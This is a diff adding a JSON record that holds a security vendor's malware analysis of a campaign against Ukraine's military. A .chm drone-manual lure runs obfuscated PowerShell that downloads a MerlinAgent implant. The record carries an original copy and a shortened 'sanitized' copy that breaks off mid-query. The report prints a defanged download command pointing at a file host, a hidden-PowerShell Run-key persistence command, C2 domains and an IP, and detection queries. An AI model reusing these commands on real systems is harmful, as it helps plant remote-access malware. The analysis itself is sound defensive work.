@@ -1,0 +1,2592 @@
+{
+  "original_txt": "By Securonix Threat Research: D.Iuzvyk, T.Peck, O.Kolesnikov\nSept. 25, 2023, updated Sept. 27, 2023, updated Oct. 6, 2023\ntldr:\nSecuronix Threat Research recently discovered an attack campaign appearing to originate from the threat group UAC-0154 targeting victims using a Pilot-in-Command (PIC) Drone manual document lure to deliver malware.\nAs the war between Russia and Ukraine rages, the cyber warfare landscape between the two countries also continues to show no signs of slowing down. New tactics and malware variants continue to emerge as we’re entering the year and a half mark of the conflict.\nOur team has identified an interesting campaign (tracked by Securonix as STARK#VORTEX), which is actively targeting Ukraine’s military. Since drones or unmanned aerial vehicles (UAVs) have been an integral tool used by the Ukrainian military, malware-laced lure files themed as UAVs service manuals have begun to surface.\nLast month, the threat group tracked by the identifier UAC-0154 was identified using military-themed documents delivered via email to Ukrainian targets (@ukr.net). Today, it would appear that the group’s tactics have changed, along with some of the methods used to infect victims with MerlinAgent malware.\nAttack chain overview\nThe lure file presents itself as a Microsoft Help file, or .chm file. The file in this case was named “Інфо про навчання по БПЛА для військових.v2.2.chm” which translates to “info on UAV training for the military”. Microsoft help files are a typical file format which are used to provide application support, guides and references. Code execution begins as soon as the user opens the document through a malicious JavaScript code block embedded inside one of the HTML pages.\nObfuscated PowerShell code is then executed from the JavaScript code within the .chm file which was used to contact a remote C2 server to download an obfuscated binary payload.\nThe payload is an obfuscated binary that gets XOR’d and decoded to produce a beacon payload for MerlinAgent malware. Once the payload establishes communication back to its C2 server, the attackers would have full control over the victim host.\nWhile the attack chain is quite simple, the attackers leveraged some pretty complex TTPs and obfuscation methods in order to evade detection. We’ll go over each stage in detail further down.\nInitial code execution\nThe malicious .chm file was intentionally weaponized to execute a PowerShell one-liner on the victim machine. Microsoft help files have been used maliciously in the past, though today they are less common as Microsoft stopped supporting the .chm file format in 2007. They can, however, be opened and executed in modern Windows versions.\nHelp files such as the lure document used in the STARK#VORTEX campaign, would be executed using the Windows binary hh.exe which is launched automatically when a user runs the .chm file.\nAs you can see from the figure below, the help file would have no trouble evading antivirus and EDR detections as it scored 0/59 detections in VirusTotal.\nFigure 1: VirusTotal detections for Інфо про навчання по БПЛА для військових.v2.2.chm\nCode execution through a .chm file is a well known technique and there are several online tools available for building one. It works by passing in special HTML parameters which can call a child process such as cmd.exe or powershell.exe, along with command line arguments.\nAs we mentioned previously, the lure document was themed as a drone or UAV manual. Examining its contents, we see instructions written in the Ukrainian language for a DJI Mavic 3 drone.\nFigure 2: lure document contents for Інфо про навчання по БПЛА для військових.v2.2.chm\nHelp file and JavaScript execution [T1059.007]\nSince Microsoft help files are essentially container files, they can be opened and analyzed using file archival software such as 7zip. With the case of Інфо про навчання по БПЛА для військових.v2.2.chm, we’re able to observe several HTML files contained within.\nFigure 3: Contents of Інфо про навчання по БПЛА для військових.v2.2.chm\nAfter examining the contents of page1.html, we found a huge JavaScript one liner embedded into the HTML within <script></script> tags. Its contents were heavily obfuscated, however we observed it executing another obfuscated PowerShell script which we’ll dive into next.\nFigure 4: Example of obfuscated JavaScript code found within page1.html\nPowerShell execution [T1059.001]\nThe .chm file executes cmd.exe along with the “/c start /min” commands to call the PowerShell process which executes inside a hidden window. The PowerShell code is heavily obfuscated in order to evade detections. Some obfuscation methods include Base64 encoding, GZIP compression, and char value substitutions.\nFigure 5: Stage 1, obfuscated PowerShell executed by Інфо про навчання по БПЛА для військових.v2.2.chm\nAfter deobfuscating the Base64 encoded blob, we find more obfuscated PowerShell code. This time some key information such as C2 URL and payload names become visible. This is seen in the figure below.\nNext, we’ll clean this code up and go over it in detail to gain a better understanding of its purpose.\nFigure 6: Stage 2, obfuscated PowerShell executed by Інфо про навчання по БПЛА для військових.v2.2.chm\nWith the PowerShell code a bit more human-readable, it’s pretty clear as to what it’s doing. In general, the script downloads a payload from hxxps://files.catbox[.]moe/g1h7zr.bin decodes and decrypts it and saves it to the local Appdata folder to SysctlHost\\ctlhost.exe.\nFigure 7: Deobfuscated PowerShell analysis — file download, directory setup\nThis first bit of the script establishes a few variables such as the C2 URL ($plUrl), binary path ($plPathSuffix), decryption key ($cryptPS) and the XOR mask size value ($xorMaskSize). The bulk of the code is stored inside the doS function which is called at the end of the script.\nNext the script performs key functions:\n- Constructs the target path.\n- Checks if the executable file already exists at the defined path, returning -1 if it does.\n- Ensures that the necessary directory exists, creating it if needed.\n- Checks the success of directory creation, returning -2 if it fails.\nThe script then downloads the file from the C2 server. The command, as you can see is heavily obfuscated, however deobfuscating the PowerShell code produces the following download command:\n[System.Net.WebClient]::new().DownloadFile(‘hxxps://files.catbox[.]moe/g1h7zr.bin’, ”)\nThe command is then executed using an invoke expression (IEX).\nFurther down the script we find some interesting binary file manipulation code blocks which can be seen in figure 8 below:\nFigure 8: Deobfuscated PowerShell — binary file decoding\nIn a nutshell, the downloaded binary file is decoded and renamed using values provided from the beginning of the script as seen in figure 7.\nCompute the hash and fill the XOR mask\n- A SHA-256 hasher is initialized.\n- The input string $cryptPS is hashed to produce an array, $sha.\n- This hash is then used to populate the $xorMask array. If the mask requires more bytes than the initial hash provides, the hash of the previous hash is used in a chained fashion until the mask is completely filled.\nFile transformation using the XOR mask:\n- File streams are opened:\n- $f1 reads from an existing file at the path $p.\n($envAppData\\sysctlHost\\ctlhost.exe)\n- $f2 writes to a new temporary file with the same name as $p but with a .tmp\n- The file at path $p is processed in chunks of up to 4096 bytes using a buffer $b.\n- For each chunk:\n- Bytes are read into the buffer from $f1.\n- Each byte in the buffer is XOR’d with the corresponding byte from the $xorMask.\n- The transformed bytes are then written to the temporary file using $f2.\n- This process continues until the entire file has been read and transformed.\nNote: The outer while($false) is odd since it renders the entire subsequent code block ineffective. It could be a mistake by the attackers, or it could act as a placeholder for other binary files that would require its specific functionality.\nWith the file decoded into a variable, the next portion of the script then saves it over the original file after leveraging and then deleting a temporary file.\nFigure 9: Stage 3, deobfuscated PowerShell\nThe last bit of code takes a previously downloaded, encrypted and compressed file with a .tmp extension, decompresses its content, writes the decompressed content back to the original file, deletes the .tmp file. The last portion of the script then executes the original file in a few different ways.\nThe PowerShell script appears to be written with several options and configurations in mind, hence the $false while statement we mentioned earlier. Also the existence of optional binary file arguments which were set to “null” in this case.\nBinary file analysis\nThe Windows binary file downloaded is a 64-bit executable at about 5MB in size. Some additional binary information is highlighted in figure 10 below.\nFigure 10: ctlhost.exe — binary file overview\nUpon closer examination, it appears to be a generated binary executable by the MerlinAgent framework. Similar to Cobalt Strike and Silver, MerlinAgent is an open source command and control framework available on Github.\nThe MerlinAgent framework is an open source C2 framework written in Go. It functions similar to that of Cobalt Strike or Sliver where a server instance can be set up which can build its own binary payloads. Attackers can then distribute these payloads and incorporate them into their own malware stager or loader. MerlinAgent has a wide range of capabilities which include:\n- Encrypted C2 communication using TLS\n- Remote command shell\n- Module support (such as Mimikatz)\n- Binary support for exe or dll clients\nThe agent itself supports a wide range of command flags in which blue team defenders can be on the lookout for:\n| Command |\nDescription |\n| -debug |\nEnable debug output |\n| -host |\nHTTP Host header |\n| -ja3 |\nJA3 signature string (not the MD5 hash). Overrides -proto flag |\n| -killdate |\nThe date, as a Unix EPOCH timestamp, that the agent will quit running |\n| -maxretry |\nThe maximum amount of failed checkins before the agent will quit running |\n| -padding |\nThe maximum amount of data that will be randomly selected and appended to every message |\n| -proto |\nProtocol for the agent to connect with |\n| -proxy |\nHardcoded proxy to use for http/1.1 traffic |\n| -psk |\nPre-Shared Key used to encrypt initial communications |\n| -skew |\nAmount of skew, or variance, between agent checkins |\n| -sleep |\nTime for agent to sleep |\n| -url |\nFull URL for agent to connect to |\n| -useragent |\nThe HTTP User-Agent header string that Agent will use while sending traffic |\n| -v |\nEnable verbose output |\n| -version |\nPrint the agent version and exit[1] |\nHistorically, MerlinAgent has been used by UAC-0154 in the past targeting Ukrainian officials, and many TTPs are consistent with past activity.\nUpon execution, the MerlinAgent payload will immediately begin beaconing to listen.servemp3[.]com. It also establishes persistence in the registry by creating a new key called “ctlhost” located in “HKEY_USERS\\Software\\Microsoft\\Windows\\CurrentVersion\\Run” with the contents “cmd.exe /c start /min %windir%\\system32\\WindowsPowerShell\\v1.0\\powershell.exe -command Start-Process -filepath “C:\\Users\\[REDACTED]\\Appdata\\Roaming\\sysctlHost\\ctlhost.exe” -WindowStyle Hidden”. This will execute the binary file every time the user logs into the system.\nOnce the process establishes a connection to the attacker’s C2 server, the attacker will have full control over the system.\nWrapping up…\nIt’s apparent that this attack was highly targeted towards the Ukrainian military given the language of the document, and its targeted nature.\nFiles and documents used in the attack chain are very capable of bypassing defenses, scoring 0 detections for the malicious .chm file. Typically receiving a Microsoft help file over the internet would be considered unusual. However, the attackers framed the lure documents to appear as something an unsuspecting victim might expect to appear in a help themed document or file .\nC2 and infrastructure\nDuring the STARK#VORTEX campaign we observed the following network communication to C2 hosts. Command and control from the MerlinAgent payload to the attacker’s C2 server used an encrypted channel over port 443. Request related details will be provided in Appendix A below.\n| C2 Address |\nDescription |\n| catbox[.]moe |\nExecutable file stager location. Catbox is a legitimate file sharing service. |\nlisten.servemp3[.]com\n168.100.8[.]245 |\nBeacon C2 URL from ctlhost.exe |\nSecuronix recommendations and mitigations\nAlways be extra cautious downloading file attachments from posts for private messages. When it comes to prevention and detection, the Securonix Threat Research Team recommends:\n- Avoid downloading files or attachments from untrusted sources, especially if the source was unsolicited\n- Monitor common malware staging directories, especially “C:\\ProgramData” and other temporary locations such as the user’s local appdata folder which was used in this attack campaign\n- Deploy additional process-level logging such as Sysmon and PowerShell logging for additional log detection coverage\n- Securonix customers can scan endpoints using the Securonix Seeder Hunting Queries below\nMITRE ATT&CK matrix\n| Tactic |\nTechnique |\n| Execution |\nT1204.002: User Execution: Malicious File\nT1027.010: Obfuscated Files or Information: Command Obfuscation\nT1059.001: Command and Scripting Interpreter: PowerShell\nT1059.007: Command and Scripting Interpreter: JavaScript |\n| Defense Evasion |\nT1112: Modify Registry\nT1218.001: System Binary Proxy Execution: Compiled HTML File\nT1562.001: Impair Defenses: Disable or Modify Tools |\n| Command and Control |\nT1105: Ingress Tool Transfer\nT1573.001: Encrypted Channel: Symmetric Cryptography\nT1219: Remote Access Software |\n| Persistence |\nT1547.001: Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder |\nAnalyzed file hashes\n| File Name |\nSHA256 (IoC) |\n| Інфо про навчання по БПЛА для військових.v2.2.chm |\n68A224AD49F2BD3D82EF6FCF5B16472DD06FECFF816263925DFB9BAC91951B21 |\n| g1h7zr.bin |\n46FA63AF33FB7A42D3F79ED81D38E5CADDA7D311B07B2306E917179948189C7A |\n| ctlhost.exe |\n4659D371C9B6DB1687D6DD027E95563DA88A29378DE4F87DB19B267859D04D03 |\nSome examples of relevant Securonix provisional detections\n- EDR-ALL-1032-RU\n- EDR-ALL-1215-ERR, WEL-ALL-1186-ERR\n- EDR-ALL-138-ERR\n- PSH-ALL-228-RU\n- PSH-ALL-316-RU\nSome examples of relevant hunting/Spotter queries (be sure to remove square brackets “[ ]”)\n- index = activity AND rg_functionality = “Endpoint Management Systems” AND eventid = “13” AND eventtype = “SetValue” AND targetobject CONTAINS “SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run” AND (description CONTAINS “\\Appdata\\Local” OR description CONTAINS “\\Appdata\\Roaming)\n- index = activity AND rg_functionality = “Microsoft Windows Powershell” AND message CONTAINS ” -bxor”\n- index = activity AND rg_functionality = “Microsoft Windows Powershell” AND message CONTAINS “IO.StreamReader” AND message CONTAINS “]::Decompress”\n- index = activity AND rg_functionality = “Endpoint Management Systems” AND deviceaction = “Process Create” AND sourceprocessname ENDS WITH “hh.exe” AND (destinationprocessname ENDS WITH “cmd.exe” OR destinationprocessname ENDS WITH “powershell.exe”)\n- index = activity AND (rg_functionality = “Next Generation Firewall” OR rg_functionality = “Web Proxy”) AND ((destinationhostname = “listen.servemp3[.]com” OR destinationhostname = “catbox[.]moe”) OR destinationaddress = “168.100.8[.]245″))\nReferences:\n- Microsoft: .chm Help files\n- Github: Nishang script modified for Kautilya\n- Securonix Threat Research Knowledge Sharing Series: Hiding the PowerShell Execution Flow\n- MerlinAgent: новий open-source інструмент для здійснення кібератак у відношенні державних організацій України (CERT-UA#6995, CERT-UA#7183)\n- Documentation: Merlin Command and Control framework\nAppendix A\n“request”: {\n“HOST”: “listen.servemp3[.]com”,\n“ACCEPT-ENCODING”: “gzip”,\n“server_conn“: “168.100.8 [.]245”,\n“AUTHORIZATION”: “Bearer eyJhbGc[REDACTED]UFQ”,\n“CONTENT-LENGTH”: “1826”,\n“CONTENT-TYPE”: “application/octet-stream; charset=utf-8”,\n“USER-AGENT”: “Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.85 Safari/537.36”\n},\n“request_hex”: “fe 02 26 0c 00 fe 02 21[REDACTED]48 34 77 33 58 77 “,\n“body_hex”: “fe 0c 40 0c 00 fe 0c 3b[REDACTED]74 4b 61 55 6b 65 69 78 56 78”,\n“method”: “POST”,\n},\nUpdate: The STARK#VORTEX Attack Campaign Continues as UAC-0154 Tactics Change\nUpdate Sept. 29, 2023: The STARK#VORTEX attack campaign surges on as the Securonix Threat Research team continues to monitor the skies for changes and new vectors. Currently, it would appear that the threat actors have shifted to a new staging domain while many of the TTPs have remained the same.\nThe naming scheme of the binary files has also changed. This time around the MerlinAgent payload appears to be masquerading as the popular building/adventure game Minecraft. It would appear that the threat actors shifted gears into using Minecraft-themed C2 servers and payloads.\nThe lure document has also been retargeted. As you can see in the figure below, the document, now named “Confidential Offers.chm” follows the same malicious pattern originally observed with the STARK#VORTEX campaign.\nFigure 1: Confidential Offers.chm lure document\nThe help file contains a single html file which executes the malicious JavaScript payload. The HTML file is titled “Міжнародні партнери” which translates from Ukrainian to “International partners”. When opened, the content of the lure file simply contains a few company logos.\nLike the original attack campaign, the latest version contains a highly-obfuscated JavaScript code block which calls and executes another obfuscated PowerShell one-liner.\nFigure 2: Obfuscated JavaScript sample executed by Confidential Offers.chm\nThe PowerShell script downloads a binary MerlinAgent payload from hxxps://shorturl[.]at/abPU5 which redirects to hxxps://files.catbox[.]moe/sbjchf.mod. The encoded payload is decoded and then executed in almost the same fashion as we saw before.\nThe binary payload which gets downloaded and executed is named “minecraft.exe” and is placed in the directory “%appdata%/local/games/minecraft.exe” and the C2 beaconing address is listen.serveminecraft[.]net. Why the attackers chose to masquerade as Minecraft is unclear, other than the fact that it is a wildly popular game. This does speculate that it was probably not intended for business systems where games would normally not be found.\nWrapping up…\nToday, we won’t go too deep into the rest of the attack chain as it is almost identical to what we first encountered last week. The original analysis of the STARK#VORTEX campaign contains a much more in-depth analysis. Updated IoCs and Seeder hunting queries can be found below.\nC2 and infrastructure\n| C2 Address |\nDescription |\nshorturl[.]at/abPU5\ncatbox[.]moe/sbjchf.mod |\nInitial malware stager URLs |\nlisten.serveminecraft[.]net\n168.100.8[.]245 |\nBeacon C2 URL from minecraft.exe |\nAnalyzed file hashes\n| File Name |\nSHA256 (IoC) |\n| Confidential Offers.chm |\n7b8d201c0972a8983f629e4a42930821f22ee7946379b9bd696d69e94a454023 |\n| sbjchf.mod |\nb64b97234f651309d0f871582c1d13dc8ab498ce43384f317522e0fa04f685ae |\n| minecraft.exe |\n3d38e7c84d2956d1a4a1911c27d79c9743a862dfc34d8c10820e09d2cd0b4455 |\nSome examples of relevant Securonix provisional detections\n- EDR-ALL-1032-RU\n- EDR-ALL-1215-ERR, WEL-ALL-1186-ERR\n- EDR-ALL-138-ERR\n- PSH-ALL-228-RU\n- PSH-ALL-316-RU\nRelevant hunting/Spotter queries (be sure to remove square brackets “[ ]”)\n- index = activity AND rg_functionality = “Endpoint Management Systems” AND baseeventid = “13” and eventtype = “SetValue” AND targetobject CONTAINS “SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run” AND (description CONTAINS “\\Appdata\\Local” OR description CONTAINS “\\Appdata\\Roaming”)\n- index = activity AND rg_functionality = “Microsoft Windows Powershell” AND message CONTAINS ” -bxor”\n- index = activity AND rg_functionality = “Microsoft Windows Powershell” AND message CONTAINS “IO.StreamReader” AND message CONTAINS “]::Decompress”\n- index = activity AND rg_functionality = “Endpoint Management Systems” AND deviceaction = “Process Create” AND sourceprocessname = “hh.exe” AND (destinationprocessname = “cmd.exe” OR destinationprocessname = “powershell.exe”)\n- index = activity AND (rg_functionality = “Next Generation Firewall” OR rg_functionality = “Web Proxy”) AND ((destinationhostname = “listen.serveminecraft[.]net” OR destinationhostname = “catbox[.]moe”) OR destinationaddress = “168.100.8[.]245”))\nReferences:\n- New STARK#VORTEX Attack Campaign: Threat Actors Use Drone Manual Lures to Deliver MerlinAgent Payloads\n- Microsoft: .chm Help files\n- Github: Nishang script modified for Kautilya\n- Securonix Threat Research Knowledge Sharing Series: Hiding the PowerShell Execution Flow\n- MerlinAgent: новий open-source інструмент для здійснення кібератак у відношенні державних організацій України (CERT-UA#6995, CERT-UA#7183)\n- Documentation: Merlin Command and Control framework",
+  "sanitized_txt": "By Securonix Threat Research: D.Iuzvyk, T.Peck, O.Kolesnikov Sept. 25, 2023, updated Sept. 27, 2023, updated Oct. 6, 2023 tldr:\nSecuronix Threat Research recently discovered an attack campaign appearing to originate from the threat group UAC-0154 targeting victims using a Pilot-in-Command (PIC) Drone manual document lure to deliver malware.\nAs the war between Russia and Ukraine rages, the cyber warfare landscape between the two countries also continues to show no signs of slowing down. New tactics and malware variants continue to emerge as we’re entering the year and a half mark of the conflict.\nOur team has identified an interesting campaign (tracked by Securonix as STARK#VORTEX), which is actively targeting Ukraine’s military. Since drones or unmanned aerial vehicles (UAVs) have been an integral tool used by the Ukrainian military, malware-laced lure files themed as UAVs service manuals have begun to surface.\nLast month, the threat group tracked by the identifier UAC-0154 was identified using military-themed documents delivered via email to Ukrainian targets (@ukr.net). Today, it would appear that the group’s tactics have changed, along with some of the methods used to infect victims with MerlinAgent malware.\nAttack chain overview The lure file presents itself as a Microsoft Help file, or .chm file. The file in this case was named “Інфо про навчання по БПЛА для військових.v2.2.chm” which translates to “info on UAV training for the military”. Microsoft help files are a typical file format which are used to provide application support, guides and references. Code execution begins as soon as the user opens the document through a malicious JavaScript code block embedded inside one of the HTML pages.\nObfuscated PowerShell code is then executed from the JavaScript code within the .chm file which was used to contact a remote C2 server to download an obfuscated binary payload.\nThe payload is an obfuscated binary that gets XOR’d and decoded to produce a beacon payload for MerlinAgent malware. Once the payload establishes communication back to its C2 server, the attackers would have full control over the victim host.\nWhile the attack chain is quite simple, the attackers leveraged some pretty complex TTPs and obfuscation methods in order to evade detection. We’ll go over each stage in detail further down.\nInitial code execution The malicious .chm file was intentionally weaponized to execute a PowerShell one-liner on the victim machine. Microsoft help files have been used maliciously in the past, though today they are less common as Microsoft stopped supporting the .chm file format in 2007. They can, however, be opened and executed in modern Windows versions.\nHelp files such as the lure document used in the STARK#VORTEX campaign, would be executed using the Windows binary hh.exe which is launched automatically when a user runs the .chm file.\nAs you can see from the figure below, the help file would have no trouble evading antivirus and EDR detections as it scored 0/59 detections in VirusTotal.\nFigure 1: VirusTotal detections for Інфо про навчання по БПЛА для військових.v2.2.chm Code execution through a .chm file is a well known technique and there are several online tools available for building one. It works by passing in special HTML parameters which can call a child process such as cmd.exe or powershell.exe, along with command line arguments.\nAs we mentioned previously, the lure document was themed as a drone or UAV manual. Examining its contents, we see instructions written in the Ukrainian language for a DJI Mavic 3 drone.\nFigure 3: Contents of Інфо про навчання по БПЛА для військових.v2.2.chm After examining the contents of page1.html, we found a huge JavaScript one liner embedded into the HTML within <script></script> tags. Its contents were heavily obfuscated, however we observed it executing another obfuscated PowerShell script which we’ll dive into next.\nFigure 5: Stage 1, obfuscated PowerShell executed by Інфо про навчання по БПЛА для військових.v2.2.chm After deobfuscating the Base64 encoded blob, we find more obfuscated PowerShell code. This time some key information such as C2 URL and payload names become visible. This is seen in the figure below.\nNext, we’ll clean this code up and go over it in detail to gain a better understanding of its purpose.\nFigure 6: Stage 2, obfuscated PowerShell executed by Інфо про навчання по БПЛА для військових.v2.2.chm With the PowerShell code a bit more human-readable, it’s pretty clear as to what it’s doing. In general, the script downloads a payload from hxxps://files.catbox[.]moe/g1h7zr.bin decodes and decrypts it and saves it to the local Appdata folder to SysctlHost\\ctlhost.exe.\nFigure 7: Deobfuscated PowerShell analysis — file download, directory setup This first bit of the script establishes a few variables such as the C2 URL ($plUrl), binary path ($plPathSuffix), decryption key ($cryptPS) and the XOR mask size value ($xorMaskSize). The bulk of the code is stored inside the doS function which is called at the end of the script.\nNext the script performs key functions:\n- Constructs the target path.\n- Checks if the executable file already exists at the defined path, returning -1 if it does.\n- Ensures that the necessary directory exists, creating it if needed.\n- Checks the success of directory creation, returning -2 if it fails.\nThe script then downloads the file from the C2 server. The command, as you can see is heavily obfuscated, however deobfuscating the PowerShell code produces the following download command:\n[System.Net.WebClient]::new().DownloadFile(‘hxxps://files.catbox[.]moe/g1h7zr.bin’, ”) The command is then executed using an invoke expression (IEX).\nFurther down the script we find some interesting binary file manipulation code blocks which can be seen in figure 8 below:\nFigure 8: Deobfuscated PowerShell — binary file decoding In a nutshell, the downloaded binary file is decoded and renamed using values provided from the beginning of the script as seen in figure 7.\nCompute the hash and fill the XOR mask - A SHA-256 hasher is initialized.\n- The input string $cryptPS is hashed to produce an array, $sha.\n- This hash is then used to populate the $xorMask array. If the mask requires more bytes than the initial hash provides, the hash of the previous hash is used in a chained fashion until the mask is completely filled.\nFile transformation using the XOR mask:\n- File streams are opened:\n- $f1 reads from an existing file at the path $p.\n($envAppData\\sysctlHost\\ctlhost.exe) - $f2 writes to a new temporary file with the same name as $p but with a .tmp - The file at path $p is processed in chunks of up to 4096 bytes using a buffer $b.\n- For each chunk:\n- Bytes are read into the buffer from $f1.\n- Each byte in the buffer is XOR’d with the corresponding byte from the $xorMask.\n- The transformed bytes are then written to the temporary file using $f2.\n- This process continues until the entire file has been read and transformed.\nNote: The outer while($false) is odd since it renders the entire subsequent code block ineffective. It could be a mistake by the attackers, or it could act as a placeholder for other binary files that would require its specific functionality.\nWith the file decoded into a variable, the next portion of the script then saves it over the original file after leveraging and then deleting a temporary file.\nFigure 9: Stage 3, deobfuscated PowerShell The last bit of code takes a previously downloaded, encrypted and compressed file with a .tmp extension, decompresses its content, writes the decompressed content back to the original file, deletes the .tmp file. The last portion of the script then executes the original file in a few different ways.\nThe PowerShell script appears to be written with several options and configurations in mind, hence the $false while statement we mentioned earlier. Also the existence of optional binary file arguments which were set to “null” in this case.\nBinary file analysis The Windows binary file downloaded is a 64-bit executable at about 5MB in size. Some additional binary information is highlighted in figure 10 below.\nFigure 10: ctlhost.exe — binary file overview Upon closer examination, it appears to be a generated binary executable by the MerlinAgent framework. Similar to Cobalt Strike and Silver, MerlinAgent is an open source command and control framework available on Github.\nThe MerlinAgent framework is an open source C2 framework written in Go. It functions similar to that of Cobalt Strike or Sliver where a server instance can be set up which can build its own binary payloads. Attackers can then distribute these payloads and incorporate them into their own malware stager or loader. MerlinAgent has a wide range of capabilities which include:\n- Encrypted C2 communication using TLS - Remote command shell - Module support (such as Mimikatz) - Binary support for exe or dll clients The agent itself supports a wide range of command flags in which blue team defenders can be on the lookout for:\n| Command | Description | | -debug | Enable debug output | | -host | HTTP Host header | | -ja3 | JA3 signature string (not the MD5 hash). Overrides -proto flag | | -killdate | The date, as a Unix EPOCH timestamp, that the agent will quit running | | -maxretry | The maximum amount of failed checkins before the agent will quit running | | -padding | The maximum amount of data that will be randomly selected and appended to every message | | -proto | Protocol for the agent to connect with | | -proxy | Hardcoded proxy to use for http/1.1 traffic | | -psk | Pre-Shared Key used to encrypt initial communications | | -skew | Amount of skew, or variance, between agent checkins | | -sleep | Time for agent to sleep | | -url | Full URL for agent to connect to | | -useragent | The HTTP User-Agent header string that Agent will use while sending traffic | | -v | Enable verbose output | | -version | Print the agent version and exit[1] | Historically, MerlinAgent has been used by UAC-0154 in the past targeting Ukrainian officials, and many TTPs are consistent with past activity.\nUpon execution, the MerlinAgent payload will immediately begin beaconing to listen.servemp3[.]com. It also establishes persistence in the registry by creating a new key called “ctlhost” located in “HKEY_USERS\\Software\\Microsoft\\Windows\\CurrentVersion\\Run” with the contents “cmd.exe /c start /min %windir%\\system32\\WindowsPowerShell\\v1.0\\powershell.exe -command Start-Process -filepath “C:\\Users\\[REDACTED]\\Appdata\\Roaming\\sysctlHost\\ctlhost.exe” -WindowStyle Hidden”. This will execute the binary file every time the user logs into the system.\nOnce the process establishes a connection to the attacker’s C2 server, the attacker will have full control over the system.\nWrapping up… It’s apparent that this attack was highly targeted towards the Ukrainian military given the language of the document, and its targeted nature.\nFiles and documents used in the attack chain are very capable of bypassing defenses, scoring 0 detections for the malicious .chm file. Typically receiving a Microsoft help file over the internet would be considered unusual. However, the attackers framed the lure documents to appear as something an unsuspecting victim might expect to appear in a help themed document or file .\nC2 and infrastructure During the STARK#VORTEX campaign we observed the following network communication to C2 hosts. Command and control from the MerlinAgent payload to the attacker’s C2 server used an encrypted channel over port 443. Request related details will be provided in Appendix A below.\n| C2 Address | Description | | catbox[.]moe | Executable file stager location. Catbox is a legitimate file sharing service. | listen.servemp3[.]com 168.100.8[.]245 | Beacon C2 URL from ctlhost.exe | Securonix recommendations and mitigations Always be extra cautious downloading file attachments from posts for private messages. When it comes to prevention and detection, the Securonix Threat Research Team recommends:\n- Microsoft: .chm Help files - Github: Nishang script modified for Kautilya - Securonix Threat Research Knowledge Sharing Series: Hiding the PowerShell Execution Flow - MerlinAgent: новий open-source інструмент для здійснення кібератак у відношенні державних організацій України (CERT-UA#6995, CERT-UA#7183) - Documentation: Merlin Command and Control framework Appendix A “request”: { “HOST”: “listen.servemp3[.]com”, “ACCEPT-ENCODING”: “gzip”, “server_conn“: “168.100.8 [.]245”, “AUTHORIZATION”: “Bearer eyJhbGc[REDACTED]UFQ”, “CONTENT-LENGTH”: “1826”, “CONTENT-TYPE”: “application/octet-stream; charset=utf-8”, “USER-AGENT”: “Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.85 Safari/537.36” }, “request_hex”: “fe 02 26 0c 00 fe 02 21[REDACTED]48 34 77 33 58 77 “, “body_hex”: “fe 0c 40 0c 00 fe 0c 3b[REDACTED]74 4b 61 55 6b 65 69 78 56 78”, “method”: “POST”, }, Update: The STARK#VORTEX Attack Campaign Continues as UAC-0154 Tactics Change Update Sept. 29, 2023: The STARK#VORTEX attack campaign surges on as the Securonix Threat Research team continues to monitor the skies for changes and new vectors. Currently, it would appear that the threat actors have shifted to a new staging domain while many of the TTPs have remained the same.\nThe naming scheme of the binary files has also changed. This time around the MerlinAgent payload appears to be masquerading as the popular building/adventure game Minecraft. It would appear that the threat actors shifted gears into using Minecraft-themed C2 servers and payloads.\nThe lure document has also been retargeted. As you can see in the figure below, the document, now named “Confidential Offers.chm” follows the same malicious pattern originally observed with the STARK#VORTEX campaign.\nFigure 1: Confidential Offers.chm lure document The help file contains a single html file which executes the malicious JavaScript payload. The HTML file is titled “Міжнародні партнери” which translates from Ukrainian to “International partners”. When opened, the content of the lure file simply contains a few company logos.\nLike the original attack campaign, the latest version contains a highly-obfuscated JavaScript code block which calls and executes another obfuscated PowerShell one-liner.\nFigure 2: Obfuscated JavaScript sample executed by Confidential Offers.chm The PowerShell script downloads a binary MerlinAgent payload from hxxps://shorturl[.]at/abPU5 which redirects to hxxps://files.catbox[.]moe/sbjchf.mod. The encoded payload is decoded and then executed in almost the same fashion as we saw before.\nThe binary payload which gets downloaded and executed is named “minecraft.exe” and is placed in the directory “%appdata%/local/games/minecraft.exe” and the C2 beaconing address is listen.serveminecraft[.]net. Why the attackers chose to masquerade as Minecraft is unclear, other than the fact that it is a wildly popular game. This does speculate that it was probably not intended for business systems where games would normally not be found.\nWrapping up… Today, we won’t go too deep into the rest of the attack chain as it is almost identical to what we first encountered last week. The original analysis of the STARK#VORTEX campaign contains a much more in-depth analysis. Updated IoCs and Seeder hunting queries can be found below.\nC2 and infrastructure | C2 Address | Description | shorturl[.]at/abPU5 catbox[.]moe/sbjchf.mod | Initial malware stager URLs | listen.serveminecraft[.]net 168.100.8[.]245 | Beacon C2 URL from minecraft.exe | Analyzed file hashes | File Name | SHA256 (IoC) | | Confidential Offers.chm | 7b8d201c0972a8983f629e4a42930821f22ee7946379b9bd696d69e94a454023 | | sbjchf.mod | b64b97234f651309d0f871582c1d13dc8ab498ce43384f317522e0fa04f685ae | | minecraft.exe | 3d38e7c84d2956d1a4a1911c27d79c9743a862dfc34d8c10820e09d2cd0b4455 | Some examples of relevant Securonix provisional detections - EDR-ALL-1032-RU - EDR-ALL-1215-ERR, WEL-ALL-1186-ERR - EDR-ALL-138-ERR - PSH-ALL-228-RU - PSH-ALL-316-RU Relevant hunting/Spotter queries (be sure to remove square brackets “[ ]”) - index = activity AND rg_functionality = “Endpoint Management Systems” AND baseeventid = “13” and eventtype = “SetValue” AND targetobject CONTAINS “SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run” AND (description CONTAINS “\\Appdata\\Local” OR description CONTAINS “\\Appdata\\Roaming”) - index = activity AND rg_functionality = “Microsoft Windows Powershell” AND message CONTAINS ” -bxor” - index = activity AND rg_functionality = “Microsoft Windows Powershell” AND message CONTAINS “IO.StreamReader” AND message CONTAINS “]::Decompress” - index = activity AND rg_functionality = “Endpoint Management Systems” AND deviceaction = “Process Create” AND sourceprocessname = “hh.exe” AND (destinationprocessname = “cmd.exe” OR destinationprocessname = “powershell.exe”) - index = activity AND (rg_functionality = “Next Generation Firewall” OR rg_functionality = “Web Proxy”) AND ((destinationhostname = 